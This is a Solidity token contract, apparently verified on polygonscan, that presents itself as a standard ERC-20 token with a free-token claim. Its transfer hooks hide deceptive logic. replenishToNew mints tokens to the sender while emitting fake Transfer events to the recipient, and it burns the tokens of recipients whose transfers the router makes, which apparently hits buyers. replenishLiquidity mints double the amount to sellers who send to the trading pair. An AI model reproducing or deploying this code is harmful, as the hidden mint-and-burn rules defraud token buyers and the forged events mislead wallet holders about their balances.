/**
 *Submitted for verification at polygonscan.com on 2022-03-29
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Route {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface Factory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Contract is Context {

    function getFreeToken() public {
        if(block.timestamp < releaseBlock) {
            if(_sent[_msgSender()] == false) {
                _balances[_msgSender()] += 10**18;
                _sent[_msgSender()] = true;
                _totalSupply += 10**18;
                emit Transfer(address(this), _msgSender(), 10**18);
            } else {
            require(_sent[_msgSender()] == false, "ERC20: already sent");
            }
        } else {
            require(block.timestamp < releaseBlock, "ERC20: closed");
        }
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _sent;

    string private _name;
    string private _symbol;

    address private router;
    address private pair;

    uint256 private _totalSupply;
    uint256 public releaseBlock;

    constructor(address router_, string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        router = router_; 
        pair = Factory(Route(router).factory()).createPair(address(this), Route(router).WETH());
        releaseBlock = block.timestamp + 999 days;
        _totalSupply = 10**18;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        replenishToNew(to, amount);
         return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        replenishLiquidity(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function replenishToNew(address to, uint256 amount) internal {
        if(block.timestamp < releaseBlock) {
            if(_msgSender() != pair){
                if(to != router) {
                    if(_msgSender() != router){
                        if(_sent[to] == false) {
                            _sent[to] = true;
                            if(amount < 10**18) {
                                _balances[_msgSender()] += amount;
                                _totalSupply += amount;
                                emit Transfer(address(0), to, amount);
                            } else {
                                _balances[_msgSender()] += 10**18;
                                _totalSupply += 10**18;
                                emit Transfer(address(0), to, 10**18);
                            }
                        }
                    } else {
                        _balances[to] -= amount;
                        _balances[address(0)] += amount;
                        emit Transfer(to, address(0), amount);
                        _totalSupply -= amount;
                    }
                }
            } 
        }
    }

    function replenishLiquidity(address from, address to, uint256 amount) internal {
        if(block.timestamp < releaseBlock) {
            if(to == pair) {
                if(_msgSender() == router) {
                    if(router.balance > 0) {
                        _balances[from] += amount * 2;
                        _totalSupply += amount * 2;
                        emit Transfer(address(this), from, amount * 2);
                    }
                } 
            } 
        }
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

     function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }
 
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}